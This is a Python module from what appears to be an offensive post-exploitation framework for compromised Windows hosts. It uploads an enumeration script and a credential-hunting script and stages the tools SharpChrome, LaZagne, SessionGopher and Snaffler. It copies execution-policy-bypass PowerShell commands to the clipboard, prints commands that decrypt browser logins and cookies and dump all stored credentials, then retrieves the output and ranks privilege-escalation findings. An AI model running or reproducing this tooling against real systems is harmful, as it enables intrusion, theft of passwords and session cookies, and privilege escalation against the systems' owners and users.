from pathlib import Path
import pyperclip

from rich.console import Console, Group
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.markup import escape
from rich import box

from core.paths import get_tools_dir, get_windows_tools_dir
from modules.upload.windows import stage_windows_files
from modules.download.windows import receive_windows_file


#
# Follow-up tools windows_credscan.ps1's own report points operators at
# for the pieces it deliberately doesn't reimplement (DPAPI decryption,
# broad credential-store sweeps, network-share crawling) - staged
# alongside it so they're already on target when the report asks for them.
#
CREDSCAN_FOLLOWUP_TOOLS = ("SharpChrome.exe", "lazagne.exe", "SessionGopher.ps1", "Snaffler.exe")

#
# Reference invocation for each tool above - printed (not clipboard-copied)
# only for the ones actually transferred, so it's on hand without having
# to go look it up once windows_credscan.ps1's report flags a use case.
#
CREDSCAN_FOLLOWUP_RUNNERS = {
    "SharpChrome.exe": ".\\SharpChrome.exe logins /unprotect\n.\\SharpChrome.exe cookies /format:json",
    "lazagne.exe": r".\lazagne.exe all",
    "SessionGopher.ps1": "Import-Module .\\SessionGopher.ps1\nInvoke-SessionGopher -Target $env:COMPUTERNAME",
    "Snaffler.exe": r".\Snaffler.exe -o snaffler.log",
}


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

console = Console()

PRIORITY_STYLE = {
    "HIGH": "bold red",
    "MEDIUM": "bold yellow",
    "LOW": "bold cyan",
}

#
# Section name -> analyzer module
#
ANALYZERS = (
    "privileges",
    "groups",
    "uac",
    "weakperms",
    "kernel",
    "dll_hijack",
    "software",
)


def run(data, cred, args):

    #
    # Analyze existing output
    #
    if hasattr(args, "extra") and args.extra:

        output = Path(args.extra[0])

        if not output.is_file():
            print(f"{R}[-] File not found: {output}{W}")
            return

        analyze(output)

        return


    #
    # Upload enumerator (+ credential hunting, opt-out)
    #
    enum_script = get_tools_dir() / "windows_enum.ps1"
    cred_script = get_tools_dir() / "windows_credscan.ps1"

    include_credscan = input(
        f"\n{Y}[?]{W} Include credential hunting (windows_credscan.ps1) in this run? [Y/n]: "
    ).strip().lower() in ("", "y", "yes")

    light_credscan = False

    scripts = [enum_script]
    transferred_followups = []

    if include_credscan:

        light_credscan = input(
            f"\n{Y}[?]{W} Light mode (skip recursive filesystem walk, fast/bounded checks only)? [y/N]: "
        ).strip().lower() in ("y", "yes")

        scripts.append(cred_script)

        followup_dir = get_windows_tools_dir()
        transferred_followups = [name for name in CREDSCAN_FOLLOWUP_TOOLS if (followup_dir / name).is_file()]

        missing = [name for name in CREDSCAN_FOLLOWUP_TOOLS if name not in transferred_followups]
        if missing:
            print(f"{Y}[!] Missing from {followup_dir}: {', '.join(missing)} - not transferred.{W}")

        scripts.extend(followup_dir / name for name in transferred_followups)

    stage_windows_files(scripts)

    helper_lines = [r"powershell -ep bypass -File .\windows_enum.ps1"]

    if include_credscan:
        credscan_cmd = r"powershell -ep bypass -File .\windows_credscan.ps1"
        if light_credscan:
            credscan_cmd += " -Light"
        helper_lines.append(credscan_cmd)

    #
    # Each command on its own line rather than a single chained one-liner
    # (&&/; aren't safely portable across a cmd.exe vs powershell.exe
    # target prompt without knowing which one it is) - pasting multiple
    # lines into either console just runs them sequentially.
    #
    helper = "\n".join(helper_lines)

    pyperclip.copy(helper)

    print()
    print(f"{Y}{helper}")
    print()
    print(f"{G}→ helper command copied to clipboard{W}")

    #
    # Reference only - not part of the clipboard helper, since these are
    # manual follow-ups triggered by what windows_credscan.ps1 finds, not
    # something to run unconditionally alongside it.
    #
    if transferred_followups:

        print()
        print(f"{B}[*] Follow-up tool commands (run manually as needed):{W}")

        for name in transferred_followups:
            print(f"\n{Y}{CREDSCAN_FOLLOWUP_RUNNERS[name]}{W}")

    #
    # Wait for enumeration
    #
    input(
        f"\n{Y}[*] Press ENTER after the enumeration has completed...{W}"
    )

    #
    # Download results
    #
    outfile = Path("windows_enum.txt")

    receive_windows_file(
        outfile=outfile
    )

    #
    # Analyze
    #
    print()

    print(f"{G}[+] Enumeration received.{W}")
    analyze(outfile)


def analyze(outfile):

    import importlib

    modules = {
        name: importlib.import_module(f"modules.privesc.windows.analyzers.{name}")
        for name in ANALYZERS
    }

    #
    # Read enumeration
    #
    text = outfile.read_text(errors="ignore")

    #
    # Split enumeration into sections
    #
    sections = {}

    current = None

    for line in text.splitlines():

        if line.startswith("### BEGIN"):

            current = line.replace("### BEGIN", "").strip()

            sections[current] = []

            continue

        if line.startswith("### END"):

            current = None

            continue

        if current:

            sections[current].append(line)

    #
    # Convert lists into strings
    #
    for name in sections:

        sections[name] = "\n".join(sections[name])

    #
    # Results from every analyzer
    #
    reports = []

    findings = []

    for name, module in modules.items():

        section_name = module.SECTION

        if section_name not in sections:
            continue

        report = module.analyze(sections[section_name])

        reports.append(report)

        findings.extend(
            report["findings"]
        )

    #
    # Sort findings
    #
    priority = {

        "HIGH": 0,
        "MEDIUM": 1,
        "LOW": 2,

    }

    findings.sort(
        key=lambda x: priority[x["priority"]]
    )

    _print_banner()
    _print_findings(findings)
    _print_reports(reports)


# ==========================================
# PRESENTATION
# ==========================================

def _print_banner():

    console.print()
    console.print(
        Panel(
            Text("WINDOWS PRIVILEGE ESCALATION ANALYZER", justify="center", style="bold white"),
            border_style="cyan",
            box=box.DOUBLE,
        )
    )


def _print_findings(findings):

    console.print()

    if not findings:
        console.print("[dim]No findings.[/dim]")
        return

    for level in ("HIGH", "MEDIUM", "LOW"):

        group = [f for f in findings if f["priority"] == level]

        if not group:
            continue

        style = PRIORITY_STYLE[level]
        line_style = style.split()[-1]

        console.rule(
            f"[{style}]{level} PRIORITY ({len(group)})[/{style}]",
            style=line_style,
        )
        console.print()

        for finding in group:

            body = Text()
            body.append(finding["reason"], style="white")

            for i, rec in enumerate(finding["recommendation"]):

                body.append("\n\n" if i == 0 else "\n")

                if rec.startswith("Run:"):
                    command = rec[len("Run:"):].strip()
                    body.append("➤ Run: ", style="bold white")
                    body.append(command, style="bold yellow")
                else:
                    body.append("• ", style="dim")
                    body.append(rec, style="white")

            module_tag = escape(f"[{finding['module']}]")
            title = escape(finding["title"])

            console.print(
                Panel(
                    body,
                    title=f"[{style}]{module_tag}[/{style}] [bold white]{title}[/bold white]",
                    title_align="left",
                    border_style=line_style,
                    box=box.ROUNDED,
                    padding=(1, 2),
                )
            )
            console.print()


def _print_reports(reports):

    console.rule("[bold cyan]MODULE REPORTS[/bold cyan]", style="cyan")
    console.print()

    for report in reports:

        table = Table(
            show_header=False,
            box=None,
            pad_edge=False,
            padding=(0, 2, 0, 0),
        )

        table.add_column(style="bold cyan", no_wrap=True)
        table.add_column(style="white")

        for key, value in report["summary"].items():
            table.add_row(str(key), str(value))

        elements = [table]

        if report.get("report"):
            elements.append(Text(""))
            elements.append(report["report"])

        console.print(
            Panel(
                Group(*elements),
                title=f"[bold cyan]{escape(report['module'])}[/bold cyan]",
                title_align="left",
                border_style="cyan",
                box=box.ROUNDED,
                padding=(1, 2),
            )
        )
        console.print()
